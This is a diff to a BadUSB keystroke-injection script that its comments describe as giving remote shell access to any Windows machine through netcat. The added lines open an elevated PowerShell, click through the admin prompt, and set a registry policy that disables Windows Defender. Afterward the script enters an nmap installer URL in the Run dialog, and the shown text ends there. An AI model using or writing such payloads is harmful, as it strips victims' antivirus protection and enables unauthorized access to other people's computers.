@@ -2,6 +2,22 @@ REM shell access to any windows machine badusb, use netcat to get remote access 
 REM then run the bad usb payload onto the targets windows machine 
 REM made by BisKit
 WINDOWS r
+STRING powershell
+ENTER
+DELAY 84
+STRING Start-Process powershell -Verb RunAs
+ENTER
+DELAY 215
+LEFTARROW
+ENTER
+DELAY 225
+STRING reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+ENTER
+DELAY 200
+ALT F4
+ALT F4
+DELAY 499
+WINDOWS r
 DELAY 215
 STRING https://nmap.org/dist/nmap-7.95-setup.exe
 ENTER
